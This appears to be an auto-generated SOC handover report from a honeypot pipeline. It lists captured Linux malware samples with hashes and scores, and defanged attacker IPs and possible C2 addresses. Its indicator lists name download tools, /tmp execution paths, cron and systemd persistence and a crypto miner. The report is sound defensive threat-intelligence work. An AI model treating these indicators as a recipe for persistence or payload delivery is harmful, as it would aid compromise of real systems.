| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `103.99.27[.]125` | ID | PT Lintas Network Solusi | **100** ⚠️ | 39 |
| `178.99.210[.]150` | IT | Fibercop S.p.A. | **100** ⚠️ | 1 |
| `47.109.23[.]53` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 5 |
| `102.180.45[.]187` | BF | Orange Burkina Faso | **100** ⚠️ | 1 |
| `80.82.65[.]22` | NL | FiberXpress BV | **100** ⚠️ | 8 |
| `141.11.0[.]18` | NL | WorldStream B.V. | **100** ⚠️ | 8 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `195.86.192[.]66` | MY | ZTNET Co., LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 28 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 1 |

---

## 🔕 False Positive Summary (28 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 3 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 59 cases |
| Tool 34  | Credential Extractor        | ✅ 78 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 51 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 28 filtered (47.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 11 priority case(s) shown individually · 19 recon entry/entries in table (1 group(s) consolidating 2 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-06T04:05:49Z_
